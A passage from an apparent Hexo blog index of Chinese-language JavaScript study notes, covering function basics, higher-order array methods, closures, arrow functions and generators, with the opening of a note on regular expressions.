class="line"><span class="javascript">            data = e.target.result; <span class="comment">// &#x27;data:image/jpeg;base64,/9j/4AAQSk...(base64编码)...&#x27;            </span></span></span><br><span class="line"><span class="javascript">            preview.style.backgroundImage = <span class="string">&#x27;url(&#x27;</span> + data + <span class="string">&#x27;)&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 以DataURL的形式读取文件:</span></span></span><br><span class="line"><span class="javascript">        reader.readAsDataURL(file);</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​                                                                    </p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DOM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS函数</title>
      <link href="/Front-end/JavaScript/%E5%87%BD%E6%95%B0.html"/>
      <url>/Front-end/JavaScript/%E5%87%BD%E6%95%B0.html</url>
      
        <content type="html"><![CDATA[<p>浏览器内置了很多函数，比如<code>alert()</code>，全称是<code>window.alert()</code></p><p>还有DOM（文档对象模型）的很多方法等等</p><span id="more"></span><h3 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">funName</span>(<span class="params">p1,p2</span>)</span>&#123;</span><br><span class="line"><span class="comment">//fun body</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意调用方式，如果将按钮和函数绑在一起，<code>()</code>是否书写效果是不一样的，<code>()</code>是函数调用运算符，匿名函数就相当与不写<code>()</code>的情况</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">button.onclick = funName();<span class="comment">/*这代表不需要点击就调用*/</span></span><br><span class="line">button.onclick = funName;<span class="comment">/* 需要点击才调用*/</span></span><br></pre></td></tr></table></figure><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//funbody</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匿名函数一般与事件联系在一起</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myButton = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line"></span><br><span class="line">myButton.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="名字空间"><a href="#名字空间" class="headerlink" title="名字空间"></a>名字空间</h3><p>为了避免不同文件的变量和函数名重复，可以将所有变量和函数绑定在一个全局变量里，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> GLOBAL = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">GLOBAL.v1 = <span class="number">1</span>;</span><br><span class="line">GLOBAL.fun = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><blockquote><p>高阶函数英文叫Higher-order function。那么什么是高阶函数？</p><p>JavaScript的函数其实都指向某个变量。既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数。</p></blockquote><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>可以快速的将数组的每个元素按照规则得到另一组数组</p><p>例如[1,2,3]得到[1,4,9]，常规思想是取出元素，进行运算，赋值给其他数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mutiple</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x*x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> li1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> li2 = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> li1)&#123;</span><br><span class="line">    li2.push(mutiple(li1[i]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用map</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mutiple</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x*x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> li1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> li2 = li1.map(mutiple);</span><br></pre></td></tr></table></figure><p>传入的mutiple就是函数本身，因为map将算法抽象了，所以很简洁，而且一眼就看出了新增了一个数组</p><blockquote><p>第二个参数可选，代表索引</p></blockquote><h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><p>map做的是简单运算，reduce做的是重复运算，传入reduce的函数必须有两个参数，一个作为算子计算，一个接收结果，简单算法如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x1, x2, x3, x4].reduce(f) == f(f(f(x1, x2), x3), x4)</span><br></pre></td></tr></table></figure><p>比如对一个数组求和</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span> (<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line">arr.reduce(sum);<span class="comment">//45</span></span><br></pre></td></tr></table></figure><h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>可以过滤掉数组的元素，回调函数的第一个参数是元素(必选)，第二个参数是元素索引，第三个参数是数组本身，回调函数应返回一个boolean值来决定是否过滤</p><p>如过滤掉一个数组重复的元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">arr.filter(<span class="function"><span class="keyword">function</span> (<span class="params">element,index,self</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> self.indexOf(element) === index;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//因为indexOf返回第一个值的索引，所以后面的相同的数据就会被过滤</span></span><br></pre></td></tr></table></figure><h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>可以对数组进行排序，如果数组里是字符串，会按照首字母的ASCII码进行排序，首字母相同会按照第二个字母的ASCII码排序，以此类推</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;Abc&#x27;</span>,<span class="string">&#x27;abc&#x27;</span>]</span><br><span class="line">arr.sort();<span class="comment">//[&quot;A&quot;, &quot;Abc&quot;, &quot;a&quot;, &quot;abc&quot;]</span></span><br></pre></td></tr></table></figure><p>如果是数组，sort默认的方法是将数字转化为字符串，然后使用ASCII码的方式进行排序，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">12</span>,<span class="number">22</span>,<span class="number">2</span>,<span class="number">15</span>];</span><br><span class="line">arr.sort();<span class="comment">//[12, 15, 2, 22]</span></span><br></pre></td></tr></table></figure><p>但因为sort是高阶函数，它的回调函数接收两个值a、b</p><ul><li>若a&lt;b，则返回一个负值表示a排在b之前</li><li>若a=b，则返回0</li><li>a&gt;b，返回一个大于0的数代表a排在后面</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 升序</span></span><br><span class="line">arr.sort(<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> x-y;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 降序</span></span><br><span class="line">arr.sort(<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> y-x;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="every"><a href="#every" class="headerlink" title="every"></a>every</h3><p>测试每个元素是否满足条件</p><p>回调函数需要一个参数，会把所有元素传递给函数，会根据函数的返回结果返回布尔值</p><h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h3><p>会把所有元素传入回调函数，但不会返回任何值，经常用来遍历</p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>查找符合规则（自己写函数定义规则）的元素，返回该元素</p><h3 id="findIndex"><a href="#findIndex" class="headerlink" title="findIndex"></a>findIndex</h3><p>返回索引</p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>除了将函数作为参数传入以外，还可以将函数返回，而<strong>闭包</strong>就是将返回一个变量环境的函数，也就是一个有状态的环境，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wrapper</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sum</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> sum1 = wrapper(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">sum1();<span class="comment">// 返回7</span></span><br></pre></td></tr></table></figure><p>注意使用<code>sum1()</code>时返回的函数才被调用，sum使用了外部函数的变量，返回的函数将参数保存了起来</p><p>因为返回的函数没有被立即执行，所以需要注意的一点就是返回的函数不能使用循环的变量，或则后续会变化的变量，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">3</span>; i++) &#123;</span><br><span class="line">        arr.push(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> i * i;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> results = count();</span><br><span class="line"><span class="keyword">var</span> f1 = results[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> f2 = results[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">var</span> f3 = results[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">f1(); <span class="comment">// 16</span></span><br><span class="line">f2(); <span class="comment">// 16</span></span><br><span class="line">f3(); <span class="comment">// 16</span></span><br></pre></td></tr></table></figure><p>为什么会返回16呢，因为函数返回时，<code>i</code>已经变成了4</p><p>如果非要使用，就必须再创建一个函数将变量值存下来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">3</span>; i++) &#123;</span><br><span class="line">        arr.push((<span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> n*n;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)(i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了一个‘创建就执行的匿名函数的语法’</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;)(<span class="number">3</span>); <span class="comment">// 9</span></span><br></pre></td></tr></table></figure><p>不加括号会报语法错误</p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><h4 id="模拟私有变量方法"><a href="#模拟私有变量方法" class="headerlink" title="模拟私有变量方法"></a>模拟私有变量方法</h4><p>面向对象编程的语言里都可以在对象内封装一个私有变量，例如Java的private，而JS并没有这种机制，但使用闭包就可以封装一个私有变量或者方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> makeCounter = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> privateCounter = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">changeBy</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">        privateCounter += val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">increment</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            changeBy(<span class="number">1</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decrement</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            changeBy(-<span class="number">1</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">value</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> privateCounter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> Counter1 = makeCounter();</span><br><span class="line"><span class="keyword">var</span> Counter2 = makeCounter();</span><br><span class="line"><span class="built_in">console</span>.log(Counter1.value()); <span class="comment">/* logs 0 */</span></span><br><span class="line">Counter1.increment();</span><br><span class="line">Counter1.increment();</span><br><span class="line"><span class="built_in">console</span>.log(Counter1.value()); <span class="comment">/* logs 2 */</span></span><br><span class="line">Counter1.decrement();</span><br><span class="line"><span class="built_in">console</span>.log(Counter1.value()); <span class="comment">/* logs 1 */</span></span><br><span class="line"><span class="built_in">console</span>.log(Counter2.value()); <span class="comment">/* logs 0 */</span></span><br></pre></td></tr></table></figure><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p>是ES6新增的一个函数定义方式，<strong>箭头函数表达式</strong>的语法比<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/function">函数表达式</a>更简洁，并且没有自己的<code>this</code>，<code>arguments</code>，<code>super</code>或<code>new.target</code>。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它不能用作构造函数。</p><p>如果函数只是一个表达式，那他的定义非常简单</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x =&gt; x * x;</span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果有语句</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x =&gt; &#123;</span><br><span class="line">    if (x &gt; 0) &#123;</span><br><span class="line">        return x * x;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        return - x * x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果有多个参数或者无参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 两个参数:</span></span><br><span class="line">(x, y) =&gt; x * x + y * y</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无参数:</span></span><br><span class="line">() =&gt; <span class="number">3.14</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可变参数:</span></span><br><span class="line">(x, y, ...rest) =&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> i, sum = x + y;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;rest.length; i++) &#123;</span><br><span class="line">        sum += rest[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果要返回一个对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x =&gt; (&#123;<span class="attr">foo</span>:x&#125;)</span><br></pre></td></tr></table></figure><h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><p>针对前面说的this对象问题在函数的函数里面的指向问题，使用箭头函数就可以解决</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">birth</span>: <span class="number">1990</span>,</span><br><span class="line">    <span class="attr">getAge</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="built_in">this</span>.birth; <span class="comment">// 1990</span></span><br><span class="line">        <span class="keyword">var</span> fn = <span class="function">() =&gt;</span> <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear() - <span class="built_in">this</span>.birth; <span class="comment">// this指向obj对象</span></span><br><span class="line">        <span class="keyword">return</span> fn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.getAge(); <span class="comment">// 25</span></span><br></pre></td></tr></table></figure><p>另外，箭头函数的<code>call()</code>和<code>apply</code>的第一个参数总是被忽略，他总是与外部调用者绑定</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">birth</span>: <span class="number">1990</span>,</span><br><span class="line">    <span class="attr">getAge</span>: <span class="function"><span class="keyword">function</span> (<span class="params">year</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="built_in">this</span>.birth; <span class="comment">// 1990</span></span><br><span class="line">        <span class="keyword">var</span> fn = <span class="function">(<span class="params">y</span>) =&gt;</span> y - <span class="built_in">this</span>.birth; <span class="comment">// this.birth仍是1990</span></span><br><span class="line">        <span class="keyword">return</span> fn.call(&#123;<span class="attr">birth</span>:<span class="number">2000</span>&#125;, year);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.getAge(<span class="number">2015</span>); <span class="comment">// 25</span></span><br></pre></td></tr></table></figure><blockquote><p>箭头函数不能使用new，没有prototype，不能作为生成器</p></blockquote><p><a href="https://www.open-open.com/lib/view/open1482063707519.html">关于箭头函数的一篇文章</a></p><h2 id="generator"><a href="#generator" class="headerlink" title="generator"></a>generator</h2><p>生成器（generator）是ES6引入的数据类型，类似函数，但会返回多个值</p><p>函数碰到return就会返回值并结束这个函数，如果没有返回值就隐式的代表<code>return undefined</code></p><p>而generator就是可以使用<code>yield</code>返回多次，比如利用它写一个计数器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">counter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> i= <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">      i++;</span><br><span class="line">    <span class="keyword">yield</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g = counter();</span><br><span class="line">g.next();<span class="comment">//返回Object &#123; value: 1, done: false &#125;</span></span><br><span class="line">g.next();<span class="comment">//返回Object &#123; value: 2, done: false &#125;</span></span><br></pre></td></tr></table></figure><p>实际上也是一个带状态的值，如果在里面写return，执行到return时done就变成true，这个生成器也就结束了</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> map </tag>
            
            <tag> reduce </tag>
            
            <tag> 闭包 </tag>
            
            <tag> 生成器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS正则</title>
      <link href="/Front-end/JavaScript/%E6%AD%A3%E5%88%99.html"/>
      <url>/Front-end/JavaScript/%E6%AD%A3%E5%88%99.html</url>
      
        <content type="html"><![CDATA[<p>JS的正则表达式使用<code>new RegExp(&#39;re&#39;,[flag])</code>新建一个对象，或者在<code>//</code>里面写都可以</p><span id="more"></span><h3 id="支持正则的方法"><a href="#支持正则的方法" class="headerlink" title="支持正则的方法"></a>支持正则的方法</h3><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/exec"><code>exec</code></a></td><td>5一个在字符串中执行查找匹配的RegExp方法，它返回一个数组（未匹配到则返回 null）。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test"><code>test</code></a></td><td>一个在字符串中测试是否匹配的RegExp方法，它返回 true 或 false。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/match"><code>match</code></a></td><td>一个在字符串中执行查找匹配的String方法，它返回一个数组，在未匹配到时会返回 null。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/matchAll"><code>matchAll</code></a></td><td>一个在字符串中执行查找所有匹配的String方法，它返回一个迭代器（iterator）。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/search"><code>search</code></a></td><td>一个在字符串中测试匹配的String方法，它返回匹配到的位置索引，或者在失败时返回-1。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace"><code>replace</code></a></td><td>一个在字符串中执行查找匹配的String方法，并且使用替换字符串替换掉匹配到的子字符串。</td></tr><tr><td><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/split"><code>split</code></a></td><td>一个使用正则表达式或者一个固定字符串分隔一个字符串，并将分隔后的子字符串存储到数组中的 <code>String</code> 方法。</td></tr></tbody></table><h3 id="搜索和替换"><a href="#搜索和替换" class="headerlink" title="搜索和替换"></a>搜索和替换</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;Hello world 1234 ./,;&#x27;</span>;</span><br><span class="line"><span class="comment">//正则表达式的规则写在‘/ /’里</span></span><br><span class="line"><span class="keyword">let</span> s2 = str.search(<span class="regexp">/[1-9]/i</span>);<span class="comment">/*也可以传递字符串，i表示忽略大小写，会返回搜索到的第一个字符的索引*/</span></span><br><span class="line">str.replace(<span class="regexp">/[a-zA-Z]/g</span>,<span class="string">&#x27;test&#x27;</span>);<span class="comment">/*g表示全局，这里代表将所有字母替换成test*/</span></span><br><span class="line"><span class="built_in">console</span>.log(s2);</span><br></pre></td></tr></table></figure><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>可以知道某字符串是否满足规则</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> re = <span class="regexp">/^#/</span>;</span><br><span class="line">re.test(<span class="string">&#x27;#这是一个注释&#x27;</span>);<span class="comment">/*返回true*/</span></span><br></pre></td></tr></table></figure><h3 id="切分字符串"><a href="#切分字符串" class="headerlink" title="切分字符串"></a>切分字符串</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a,b, c  d&#x27;</span>.split(<span 